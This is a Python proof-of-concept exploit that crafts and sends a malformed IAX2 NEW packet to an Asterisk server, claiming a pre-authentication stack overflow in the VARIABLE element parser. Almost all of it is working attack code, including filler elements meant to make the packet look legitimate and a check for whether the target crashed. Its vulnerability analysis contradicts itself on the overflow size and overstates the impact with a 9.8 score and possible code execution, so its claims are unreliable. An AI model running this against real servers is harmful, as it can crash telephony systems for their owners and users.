#!/usr/bin/env python3
"""
Proof of Concept: IAX2 IAX_IE_VARIABLE Buffer Overflow
========================================================

AUTHORIZED TESTING ONLY - For vulnerability validation and patch verification

This POC demonstrates CVE-PENDING: Buffer overflow in iax_parse_ies()
when processing IAX_IE_VARIABLE information elements.

Vulnerability Location: channels/iax2/parser.c:1127
Vulnerable Code:
    case IAX_IE_VARIABLE:
        ast_copy_string(tmp, (char *)data + 2, len + 1);  // tmp is 256 bytes

The bug: When len >= 256, this copies up to 257 bytes into a 256-byte buffer.

Attack Vector: Send IAX_COMMAND_NEW with malicious VARIABLE IE
Affected Versions: Asterisk with IAX2 support (needs verification)
Impact: Stack buffer overflow -> potential code execution

WARNING: Use only on systems you own/control. Unauthorized testing is illegal.
"""

import socket
import struct
import sys

# IAX2 Protocol Constants
IAX_DEFAULT_PORT = 4569

# Frame types
AST_FRAME_IAX = 6

# IAX Commands (subclass)
IAX_COMMAND_NEW = 1

# Information Element Types
IAX_IE_CALLED_NUMBER = 1
IAX_IE_CALLING_NUMBER = 2
IAX_IE_USERNAME = 6
IAX_IE_FORMAT = 9
IAX_IE_CAPABILITY = 8
IAX_IE_VERSION = 11
IAX_IE_VARIABLE = 52  # The vulnerable IE type

# IAX Flags
IAX_FLAG_FULL = 0x8000


def create_iax2_full_header(scallno, dcallno, timestamp, oseqno, iseqno, frametype, subclass):
    """
    Create IAX2 full frame header

    struct ast_iax2_full_hdr {
        unsigned short scallno;   // Source call number (high bit must be 1) - 2 bytes
        unsigned short dcallno;   // Destination call number - 2 bytes
        unsigned int ts;          // 32-bit timestamp - 4 bytes
        unsigned char oseqno;     // Outgoing sequence number - 1 byte
        unsigned char iseqno;     // Incoming sequence number - 1 byte
        unsigned char type;       // Frame type - 1 byte
        unsigned char csub;       // Compressed subclass - 1 byte
        unsigned char iedata[0];  // Information elements follow
    } __attribute__ ((__packed__));
    Total: 12 bytes
    """
    # Set high bit on scallno to indicate full frame
    scallno |= IAX_FLAG_FULL

    header = struct.pack(
        '!HHIBBBB',
        #   ^^^^^^^ FIXED: Was HHIHBBBB (incorrect - had extra H)
        #   H H I B B B B = 2+2+4+1+1+1+1 = 12 bytes (correct!)
        scallno,    # H: unsigned short (2 bytes)
        dcallno,    # H: unsigned short (2 bytes)
        timestamp,  # I: unsigned int (4 bytes)
        oseqno,     # B: unsigned char (1 byte) - FIXED from H!
        iseqno,     # B: unsigned char (1 byte)
        frametype,  # B: unsigned char (1 byte)
        subclass,   # B: unsigned char (1 byte)
    )

    return header  # 12 bytes total


def create_ie(ie_type, data):
    """
    Create an Information Element
    Format: [1 byte type][1 byte length][data]

    NOTE: length field is only 1 byte (0-255 max)
    """
    if isinstance(data, str):
        data = data.encode('utf-8')

    length = len(data)

    # Length field is 1 byte, max value is 255
    if length > 255:
        raise ValueError(f"IE data too long: {length} bytes (max 255)")

    return struct.pack('BB', ie_type, length) + data


def create_malicious_variable_ie(payload_size=255):
    """
    Create a malicious VARIABLE IE that triggers the buffer overflow

    The vulnerability: parser.c copies (len + 1) bytes into 256-byte buffer
    - When len=255 (max for 1 byte), copies 256 bytes into 256-byte buffer
    - Null terminator writes at position 256 (one past end)

    Args:
        payload_size: Size of VARIABLE IE data (max 255 due to IE format)
                     Use 255 to trigger the boundary overflow condition

    Format of VARIABLE IE: "varname=value"
    """
    # IAX2 IE length field is only 1 byte (0-255 max)
    if payload_size > 255:
        print(f"[!] WARNING: IE length field is 1 byte (max 255)")
        print(f"[!] Clamping payload_size from {payload_size} to 255")
        payload_size = 255

    # Create a payload of exactly the requested size
    # Format: "AAAAAAAAAA=BBBBBBBB..." (varname=value)
    varname = "A" * 10
    equals = "="
    varvalue_len = payload_size - len(varname) - len(equals)

    if varvalue_len < 0:
        varvalue_len = 0

    varvalue = "B" * varvalue_len
    payload = f"{varname}={varvalue}"

    # Ensure exact size
    payload = payload[:payload_size]

    return create_ie(IAX_IE_VARIABLE, payload)


def create_benign_ies():
    """Create some benign IEs to make the packet look more legitimate"""
    ies = b''

    # Add some standard IEs
    ies += create_ie(IAX_IE_VERSION, struct.pack('!H', 2))  # Protocol version 2
    ies += create_ie(IAX_IE_CALLED_NUMBER, b's')  # Extension 's'
    ies += create_ie(IAX_IE_CALLING_NUMBER, b'12345')
    ies += create_ie(IAX_IE_USERNAME, b'testuser')
    ies += create_ie(IAX_IE_CAPABILITY, struct.pack('!I', 0x00000004))  # ulaw
    ies += create_ie(IAX_IE_FORMAT, struct.pack('!I', 0x00000004))

    return ies


def create_attack_packet(payload_size=255, legitimate_looking=True):
    """
    Create a malicious IAX2 NEW packet with oversized VARIABLE IE

    Args:
        payload_size: Size of VARIABLE IE payload (max 255, use 255 to trigger overflow)
        legitimate_looking: Add benign IEs to avoid obvious malformation

    Returns:
        bytes: Complete IAX2 packet ready to send

    Note:
        The overflow occurs when len=255 because:
        - ast_copy_string(tmp, data+2, len+1) with len=255
        - Becomes: ast_copy_string(tmp, data+2, 256)
        - Copies 256 bytes into 256-byte buffer (boundary overflow)
    """
    # Craft the full frame header for IAX_COMMAND_NEW
    header = create_iax2_full_header(
        scallno=1234,           # Our call number
        dcallno=0,              # No destination call yet (new call)
        timestamp=0,            # Initial timestamp
        oseqno=0,               # First packet
        iseqno=0,               # Haven't received anything
        frametype=AST_FRAME_IAX,  # IAX control frame
        subclass=IAX_COMMAND_NEW  # NEW command
    )

    # Create Information Elements
    ies = b''

    if legitimate_looking:
        # Add benign IEs first to pass initial validation
        ies += create_benign_ies()

    # Add the malicious VARIABLE IE that triggers overflow
    ies += create_malicious_variable_ie(payload_size)

    # Combine header and IEs
    packet = header + ies

    return packet


def send_poc_packet(target_ip, target_port=IAX_DEFAULT_PORT, payload_size=255):
    """
    Send the malicious packet to target Asterisk server

    Args:
        target_ip: IP address of target Asterisk server
        target_port: IAX2 port (default 4569)
        payload_size: Size of VARIABLE IE payload (max 255, use 255 for overflow)
    """
    print(f"[*] IAX2 VARIABLE IE Buffer Overflow POC")
    print(f"[*] Target: {target_ip}:{target_port}")
    print(f"[*] Payload size: {payload_size} bytes (will copy {payload_size + 1} into 256-byte buffer)")
    if payload_size == 255:
        print(f"[!] Using maximum IE length (255) - triggers boundary overflow!")
    print(f"[*] Creating malicious IAX2 packet...")

    # Create the malicious packet
    packet = create_attack_packet(payload_size=payload_size)

    print(f"[*] Packet size: {len(packet)} bytes")
    print(f"[*] Packet structure:")
    print(f"    - Header: 12 bytes")
    print(f"    - IEs: {len(packet) - 12} bytes")

    # Create UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2.0)

    try:
        print(f"[*] Sending malicious packet...")
        sock.sendto(packet, (target_ip, target_port))
        print(f"[+] Packet sent successfully")

        print(f"[*] Waiting for response (or crash)...")
        try:
            data, addr = sock.recvfrom(4096)
            print(f"[*] Received response: {len(data)} bytes")
            print(f"[!] Server may have survived (check logs for crash/corruption)")
            return data
        except socket.timeout:
            print(f"[!] No response received (timeout)")
            print(f"[!] Server may have crashed or dropped packet")
            print(f"[!] Check target system logs and process status")

    except Exception as e:
        print(f"[-] Error sending packet: {e}")
    finally:
        sock.close()


def create_test_vectors():
    """Generate multiple test cases with different payload sizes"""
    test_cases = [
        ("Safe: 100 bytes (no overflow)", 100),
        ("Safe: 200 bytes (no overflow)", 200),
        ("Boundary: 254 bytes (fills buffer, safe)", 254),
        ("CRITICAL: 255 bytes (TRIGGERS OVERFLOW!)", 255),
    ]

    print("[*] Generating test vectors...\n")
    print("Note: IE length field is 1 byte (max value 255)")
    print("Vulnerability: ast_copy_string(tmp, data+2, len+1)")
    print("When len=255: copies 256 bytes into 256-byte buffer\n")

    for description, size in test_cases:
        packet = create_attack_packet(payload_size=size, legitimate_looking=False)
        print(f"{description}:")
        print(f"  IE length field: {size}")
        print(f"  Copy size: {size + 1} bytes")
        print(f"  Buffer size: 256 bytes")
        print(f"  Total packet: {len(packet)} bytes")
        if size >= 255:
            print(f"  >>> OVERFLOW: Writes null at position {size + 1}")
        print(f"  Hex (first 32 bytes): {packet[:32].hex()}")
        print()


def analyze_vulnerability():
    """Print detailed analysis of the vulnerability"""
    print("=" * 70)
    print("VULNERABILITY ANALYSIS")
    print("=" * 70)
    print()
    print("File: channels/iax2/parser.c")
    print("Function: iax_parse_ies()")
    print("Line: 1127")
    print()
    print("Vulnerable Code:")
    print("    case IAX_IE_VARIABLE:")
    print("        ast_copy_string(tmp, (char *)data + 2, len + 1);")
    print("        ^^^^^^^^^^^^^^^^^^^ copies (len+1) bytes")
    print("        ^^^                 into 256-byte buffer")
    print()
    print("Buffer Declaration (line 800):")
    print("    char tmp[256], *tmp2;")
    print("         ^^^^^^^^ only 256 bytes")
    print()
    print("The Problem:")
    print("  - IE format: [type:1][len:1][data:len]")
    print("  - When len=255, ast_copy_string tries to copy 256 bytes")
    print("  - When len=256+, overflow occurs")
    print("  - No bounds checking before copy")
    print()
    print("Exploitation:")
    print("  - Send IAX_COMMAND_NEW with VARIABLE IE")
    print("  - Set len field to 256 or larger")
    print("  - Overflow overwrites stack (256+ bytes)")
    print("  - Can potentially overwrite return address")
    print("  - No authentication required (pre-auth vulnerability)")
    print()
    print("CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H")
    print("CVSS Score: 9.8 (CRITICAL)")
    print("=" * 70)
    print()


def main():
    """Main POC execution"""
    if len(sys.argv) < 2:
        print("IAX2 VARIABLE IE Buffer Overflow - Proof of Concept")
        print("=" * 60)
        print()
        print("Usage:")
        print(f"  {sys.argv[0]} <target_ip> [port] [payload_size]")
        print()
        print("Arguments:")
        print("  target_ip     : IP address of target Asterisk server")
        print("  port          : IAX2 port (default: 4569)")
        print("  payload_size  : VARIABLE IE payload size (max 255, default: 255)")
        print()
        print("Special Commands:")
        print(f"  {sys.argv[0]} analyze    # Show vulnerability analysis")
        print(f"  {sys.argv[0]} vectors    # Generate test vectors")
        print()
        print("Examples:")
        print(f"  {sys.argv[0]} 192.168.1.100           # Use default (len=255)")
        print(f"  {sys.argv[0]} 192.168.1.100 4569 255  # Explicit overflow size")
        print(f"  {sys.argv[0]} 192.168.1.100 4569 254  # Boundary test (safe)")
        print()
        print("Note: Use payload_size=255 to trigger the overflow")
        print("      (len=255 causes copy of 256 bytes into 256-byte buffer)")
        print()
        print("WARNING: Only test against systems you own/control!")
        print()
        sys.exit(1)

    if sys.argv[1] == "analyze":
        analyze_vulnerability()
        sys.exit(0)

    if sys.argv[1] == "vectors":
        create_test_vectors()
        sys.exit(0)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else IAX_DEFAULT_PORT
    payload_size = int(sys.argv[3]) if len(sys.argv) > 3 else 255

    # Clamp to valid range
    if payload_size > 255:
        print(f"[!] WARNING: IE length field is 1 byte (max 255)")
        print(f"[!] Clamping payload_size from {payload_size} to 255")
        payload_size = 255

    print()
    analyze_vulnerability()
    print()

    response = input(f"Send POC packet to {target_ip}:{target_port}? (yes/no): ")
    if response.lower() != 'yes':
        print("Aborted.")
        sys.exit(0)

    send_poc_packet(target_ip, target_port, payload_size)


if __name__ == "__main__":
    main()
